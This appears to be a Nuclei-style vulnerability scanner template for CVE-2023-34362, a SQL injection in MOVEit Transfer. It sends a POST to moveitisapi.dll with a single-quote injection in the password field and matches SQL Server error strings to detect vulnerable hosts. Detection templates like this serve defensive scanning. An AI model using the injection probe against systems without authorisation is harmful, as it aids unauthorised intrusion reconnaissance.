## CVE-2023-34362 - MOVEit Transfer SQL Injection
id: CVE-2023-34362
info:
  name: MOVEit Transfer SQL Injection
  author: Tamilsevan S
  severity: critical
  tags: cve,cve2023,sql,sqli,moveit,progress
  reference:
    - https://www.mandiant.com/resources/blog/critical-vulnerability-progress-moveit-transfer
    - https://www.progress.com/moveit-transfer/critical-vulnerability-2023

requests:
  - method: POST
    path:
      - "{{BaseURL}}/moveitisapi/moveitisapi.dll"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=m2&database=MoveitDMZ&server=127.0.0.1&instancename=sqlexpress&user=sa&password=test'
    matchers:
      - type: word
        words:
          - "SQL Server"
          - "incorrect syntax"
          - "unclosed quotation mark"
        condition: or

